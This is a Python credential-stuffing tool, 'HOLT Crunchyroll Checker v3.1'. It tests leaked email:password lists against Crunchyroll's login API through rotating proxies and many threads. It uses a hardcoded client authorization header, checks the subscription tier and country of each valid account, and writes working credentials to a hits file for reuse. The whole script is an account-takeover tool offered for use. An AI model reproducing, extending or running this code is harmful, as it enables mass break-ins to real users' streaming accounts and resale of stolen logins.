#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HOLT - Crunchyroll Checker v3.1
Made by bufferclick
Discord: https://discord.gg/SWNTBqQE25
"""

import os
import sys
import time
import uuid
import random
import urllib.parse
import requests
import threading
from datetime import datetime
from collections import deque
from concurrent.futures import ThreadPoolExecutor

# ==================== CONFIG ====================
THREADS = 90
PROXY_TYPE = "http"      # http, socks4, socks5
AUTO_THREADS = True
# ===============================================

stats = {
    'checked': 0, 'hits': 0, 'custom': 0, 'invalid': 0, 'retries': 0,
    'total': 0, 'start_time': time.time(),
    'mega_fan': 0, 'fan': 0, 'ultimate': 0,
    'current_combo': 'Starting...', 'live_logs': deque(maxlen=15)
}

lock = threading.Lock()
stop_event = threading.Event()

FLAGS = {
    "US": "United States", "GB": "United Kingdom", "DE": "Germany", "FR": "France", "JP": "Japan",
    "BR": "Brazil", "CA": "Canada", "AU": "Australia", "IN": "India", "RU": "Russia",
    "KR": "South Korea", "ES": "Spain", "IT": "Italy", "NL": "Netherlands", "SE": "Sweden",
    "AR": "Argentina", "MX": "Mexico", "TR": "Turkey", "SA": "Saudi Arabia", "EG": "Egypt"
}

def log(msg):
    with lock:
        timestamp = datetime.now().strftime("%H:%M:%S")
        stats['live_logs'].append(f"[{timestamp}] {msg}")

def load_combos():
    files = []
    for f in os.listdir():
        if f.lower().endswith(('.txt', '.combo')) and os.path.isfile(f):
            files.append(f)
    
    if not files:
        print("No combo file found in current folder!")
        sys.exit(1)
    
    print("Found combo files:")
    for i, f in enumerate(files, 1):
        print(f"{i}. {f}")
    
    while True:
        try:
            choice = int(input(f"\nSelect file (1-{len(files)}): ")) - 1
            path = files[choice]
            break
        except:
            print("Invalid choice!")
    
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line and line.strip()]
    
    print(f"Loaded {len(combos)} combos from {path}")
    return combos

def load_proxies():
    if not os.path.exists('proxy.txt'):
        print("proxy.txt not found → running proxyless")
        return []
    with open('proxy.txt', 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    print(f"Loaded {len(proxies)} proxies")
    return proxies

def get_proxy(proxies):
    if not proxies:
        return None
    return random.choice(proxies)

def check(email, password, proxies):
    global stats
    
    proxy_str = get_proxy(proxies)
    session = requests.Session()
    
    if proxy_str:
        scheme = PROXY_TYPE if PROXY_TYPE != "http" else "http"
        proxy_url = f"{scheme}://{proxy_str}"
        session.proxies = {"http": proxy_url, "https": proxy_url}
    
    device_id = str(uuid.uuid4())
    headers = {
        "User-Agent": "Crunchyroll/3.74.2 Android/13 okhttp/4.12.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic YWpjeWxmd2R0amp0cTdxcGdrczM6b0tvVThETVpXN1NBYVFpR3pVRWRUUUc0SWlta0w4SV8="
    }
    
    payload = (
        f"grant_type=password&username={urllib.parse.quote(email)}"
        f"&password={urllib.parse.quote(password)}&scope=offline_access"
        f"&device_id={device_id}&device_name=samsung&device_type=SM-G998B"
    )
    
    with lock:
        stats['current_combo'] = email
    
    try:
        r = session.post(
            "https://beta-api.crunchyroll.com/auth/v1/token",
            data=payload,
            headers=headers,
            timeout=15
        )
        
        if r.status_code == 401:
            with lock:
                stats['invalid'] += 1
            log(f"Invalid → {email}")
            return
        
        if r.status_code != 200:
            with lock:
                stats['retries'] += 1
            return
        
        token = r.json().get("access_token")
        if not token:
            with lock:
                stats['retries'] += 1
            return
        
        # Get account info
        headers["Authorization"] = f"Bearer {token}"
        r2 = session.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers, timeout=10)
        
        if r2.status_code == 403:
            with lock:
                stats['custom'] += 1
            log(f"Custom/Restricted → {email}")
            with open("custom.txt", "a", encoding="utf-8") as f:
                f.write(f"{email}:{password}\n")
            return
        
        if r2.status_code != 200:
            with lock:
                stats['retries'] += 1
            return
        
        external_id = r2.json().get("external_id")
        
        # Get subscription
        r3 = session.get(
            f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
            headers=headers,
            timeout=10
        )
        
        plan = "Free"
        streams = "0"
        country = "Unknown"
        flag = "Unknown"
        
        if r3.status_code == 200:
            data = r3.json()
            items = data.get("items", [])
            for item in items:
                benefit = item.get("benefit", "")
                if "concurrent_streams.6" in benefit:
                    plan = "Ultimate Fan"
                    streams = "6"
                elif "concurrent_streams.4" in benefit:
                    plan = "Mega Fan"
                    streams = "4"
                elif "concurrent_streams.1" in benefit:
                    plan = "Fan"
                    streams = "1"
            
            country_code = data.get("items", [{}])[0].get("subscription_country", "XX")
            country_name = FLAGS.get(country_code.upper(), "Unknown")
            flag = country_code.upper()
        
        # Save hit
        line = f"{email}:{password} | {plan} | {streams} streams | {flag} {country_name}"
        with open("hits.txt", "a", encoding="utf-8") as f:
            f.write(line + "\n")
        
        with lock:
            stats['hits'] += 1
            if "Mega" in plan:
                stats['mega_fan'] += 1
            elif "Fan" in plan and "Ultimate" not in plan:
                stats['fan'] += 1
            elif "Ultimate" in plan:
                stats['ultimate'] += 1
        
        log(f"HIT → {email} | {plan}")
        
    except Exception as e:
        with lock:
            stats['retries'] += 1

def worker(combos, proxies):
    while not stop_event.is_set() and combos:
        try:
            combo = combos.pop()
            email, password = combo.split(":", 1)
            check(email, password, proxies)
            with lock:
                stats['checked'] += 1
        except:
            pass

def auto_thread_adjust():
    global THREADS
    while not stop_event.is_set():
        time.sleep(25)
        if not AUTO_THREADS or stats['checked'] < 50:
            continue
            
        error_rate = stats['retries'] / stats['checked']
        if error_rate > 0.4 and THREADS > 30:
            THREADS -= 20
            log(f"Auto Threads ↓ {THREADS} (too many retries)")
        elif error_rate < 0.1 and THREADS < 150:
            THREADS += 20
            log(f"Auto Threads ↑ {THREADS} (good speed)")

def ui():
    while not stop_event.is_set():
        os.system('clear')
        elapsed = int(time.time() - stats['start_time'])
        mins, secs = divmod(elapsed, 60)
        cpm = int(stats['checked'] / max(elapsed, 1) * 60)
        
        print("╔═══════════════════════════════════════════════════════╗")
        print("║             HOLT - Crunchyroll Checker v3.1           ║")
        print("║                  Made by bufferclick                  ║")
        print("╚═══════════════════════════════════════════════════════╝\n")
        
        print(f"Checked : {stats['checked']}/{stats['total']}  │  Hits: {stats['hits']}  │  Free/Custom: {stats['custom']}  │  Bad: {stats['invalid']}")
        print(f"CPM     : {cpm:<6} │  Time: {mins:02d}:{secs:02d}     │  Threads: {THREADS} {'(Auto)' if AUTO_THREADS else ''}")
        print(f"Mega Fan: {stats['mega_fan']}  │  Fan: {stats['fan']}  │  Ultimate: {stats['ultimate']}\n")
        
        print(f"Current → {stats['current_combo']}\n")
        
        print("Live Console:")
        print("─" * 55)
        for log_entry in stats['live_logs']:
            print(log_entry)
        print("─" * 55)
        
        time.sleep(1)

def main():
    global stats
    
    print("HOLT Crunchyroll Checker v3.1")
    print("Made by bufferclick | https://discord.gg/SWNTBqQE25\n")
    
    combos = load_combos()
    proxies = load_proxies()
    
    stats['total'] = len(combos)
    
    open("hits.txt", "w").close()
    open("custom.txt", "w").close()
    
    threading.Thread(target=ui, daemon=True).start()
    if AUTO_THREADS:
        threading.Thread(target=auto_thread_adjust, daemon=True).start()
    
    input("\nPress ENTER to start checking...")
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(worker, combos[:], proxies) for _ in range(THREADS)]
        
        try:
            for future in futures:
                future.result()
        except KeyboardInterrupt:
            stop_event.set()
            print("\n\nStopped by user!")
    
    print("\nFinished! Check hits.txt and custom.txt")

if __name__ == "__main__":
    main()
